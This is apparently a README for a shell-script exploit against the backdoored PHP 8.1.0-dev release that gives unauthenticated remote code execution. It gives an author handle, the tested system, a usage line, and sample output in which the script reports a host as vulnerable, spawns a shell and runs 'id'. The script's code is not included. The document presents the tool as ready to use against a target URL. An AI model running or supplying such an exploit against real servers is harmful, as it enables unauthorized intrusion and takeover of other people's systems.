# **PHP 8.1.0-dev (backdoor) | Remote Code Execution (Unauthenticated)**

## A simple PHP 8.1.0-dev exploit exploit written in a shell script that exploits a backdoor vulnerability that allows an attacker to execute remote code.

### **Vendor Homepage:** https://www.php.net/
### **Version:** PHP 8.1.0-dev
### **Tested on:** Ubuntu 20.04.2 LTS (5.4.0-80-generic)
### **Author:** Kl3gari

## **Usage:**
### `./php_8.1_rce.sh [URL]`

## **Example:**
```
./php_8.1_rce.sh http://10.10.10.145/
Checking if host is vulnerable...

 Vulnerable --> PHP/8.1.0
 [+] Spawning shell

$ id
uid=1000(test) gid=1000(test) groups=1000(test)
$

```
